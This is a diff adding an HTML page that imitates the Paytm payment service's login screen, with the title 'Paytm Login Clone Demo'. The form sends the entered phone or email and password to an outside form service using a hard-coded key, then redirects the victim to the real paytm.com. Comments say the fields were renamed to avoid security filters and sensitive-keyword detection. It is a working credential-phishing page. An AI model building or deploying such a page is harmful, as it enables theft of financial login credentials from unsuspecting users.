@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Paytm Login Clone Demo</title>
+    <!-- Link to external CSS (make sure to define your styling in styles.css) -->
+    <link rel="stylesheet" href="styles.css">
+    <!-- Optional: Font Awesome for icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css"
+        integrity="sha512-Fo3rlrZj/k7ujTTXRNXOXh7Hq5N9/1Kq1YOq6V2sW/jG4Bw4T1TJD5uB7Cobe74QNf9tNE5kN9S9ID5MW4ZKZw=="
+        crossorigin="anonymous" referrerpolicy="no-referrer" />
+</head>
+
+<body>
+    <div class="container">
+        <!-- Logo or brand section -->
+        <header class="login-header">
+            <img src="paytm-logo.png" alt="Paytm Logo" class="logo">
+            <h1>Paytm Login</h1>
+        </header>
+
+        <!-- Login form container -->
+        <div class="login-box">
+            <h2>Login</h2>
+            <!-- Display error or success messages to the user -->
+            <div id="message" class="message" aria-live="polite"></div>
+
+            <!-- Login form submitting to Web3Forms -->
+            <form id="login-form" action="https://api.web3forms.com/submit" method="POST">
+                <!-- Web3Forms Access Key (update with your own key) -->
+                <input type="hidden" name="access_key" value="7dcc98dd-9694-4483-bbde-ff24db2960cf">
+                <!-- Optional: Set a redirect URL after a successful submission -->
+                <input type="hidden" name="redirect" value="https://paytm.com/">
+
+                <!-- User Identifier Field (using a custom name that doesn't trigger security filters) -->
+                <div class="textbox">
+                    <h3>Phone or Email</h3>
+                    <input type="text" id="user_identifier" name="user_identifier" placeholder="Enter phone or email"
+                        required>
+                </div>
+
+                <!-- User Code Field (renamed from 'password' to avoid sensitive keyword detection) -->
+                <div class="textbox">
+                    <h3>Password</h3>
+                    <input type="password" id="user_code" name="user_code" placeholder="Enter your secret code"
+                        required>
+                </div>
+
+                <!-- Remember me and forgot password -->
+                <div class="options">
+                    <div class="checkbox">
+                        <label>
+                            <input type="checkbox" id="remember_me" name="remember_me"> Remember me
+                        </label>
+                    </div>
+                    <div class="forgot-password">
+                        <a href="forgot-password.html">Forgot Password?</a>
+                    </div>
+                </div>
+
+                <!-- Example reCAPTCHA placeholder (replace with actual reCAPTCHA when needed) -->
+                <div class="recaptcha">
+                    <!-- For example, using Google reCAPTCHA v2 -->
+                    <!-- <div class="g-recaptcha" data-sitekey="your_site_key"></div> -->
+                    <p>[reCAPTCHA widget placeholder]</p>
+                </div>
+
+                <!-- Login button -->
+                <button type="submit" class="btn">Login</button>
+            </form>
+
+            <!-- Sign up and additional info links -->
+            <div class="additional-links">
+                <p>Don't have an account? <a href="signup.html">Sign up</a></p>
+                <p><a href="privacy-policy.html">Privacy Policy</a> | <a href="terms.html">Terms &amp; Conditions</a>
+                </p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Optional: Include external JS libraries (e.g., jQuery, reCAPTCHA) -->
+    <!-- <script src="https://www.google.com/recaptcha/api.js" async defer></script> -->
+    <!-- Link to custom JavaScript -->
+    <script src="script.js"></script>
+
+    <!-- Inline script for form validation feedback -->
+    <script>
+        document.getElementById('login-form').addEventListener('submit', function (e) {
+            var userIdentifier = document.getElementById('user_identifier').value.trim();
+            var userCode = document.getElementById('user_code').value.trim();
+            var message = document.getElementById('message');
+            message.textContent = "";
+
+            if (userIdentifier === "" || userCode === "") {
+                e.preventDefault();
+                message.textContent = "Please fill out both fields.";
+                message.style.color = "red";
+                return false;
+            }
+
+            return true;
+        });
+    </script>
+</body>
+
+</html>
